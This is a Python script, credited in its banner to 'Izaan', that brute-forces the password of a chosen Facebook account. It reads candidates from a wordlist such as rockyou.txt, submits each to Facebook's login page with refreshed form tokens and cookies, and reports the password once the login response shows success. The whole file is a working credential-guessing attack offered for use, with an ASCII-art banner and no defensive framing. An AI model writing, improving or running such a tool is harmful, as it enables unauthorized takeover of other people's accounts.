import getpass

import requests
from bs4 import BeautifulSoup

post_url = "https://www.facebook.com/login.php"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload = {}
cookie = {}


def create_form():
    form = dict()
    cookie = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(post_url, headers=headers)
    for i in data.cookies:
        cookie[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookie


def function(email, passw, i):
    global payload, cookie
    if i % 10 == 1:
        payload, cookie = create_form()
        payload['email'] = email
    payload['pass'] = passw
    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)
    if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
        open('temp', 'w').write(str(r.content))
        print('\n[+] Password Found : ', passw)
        return True
    return False


global file
user = getpass.getuser()
print('\n[+] ---------- FaceBook Brute Force ----------')
print("""             ________________________________________________
            /                                                 \\
           |    _________________________________________     |
           |   |                                         |    |
           |   |   C:/root> Run FaceBook Brute Force     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---'""")
print("[+] [Face Book Brute Force By Izaan]")
uinput = input("[!] Enter File Name (Leave Blank For rockyou.txt): ")
if uinput == "":
    file = open('rockyou.txt', 'r')
else:
    file = open(uinput, 'r')

email = input('[+] Enter Email/Username : ')

print("\n[+] Target Email ID : ", email)
if uinput == "":
    uinput = "rockyou.txt"
    print(f"\n[+] Trying Passwords from {uinput}...")
i = 0
while file:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print("[+] Password Number: " + str(i) + " : ", passw)
    if function(email, passw, i):
        break
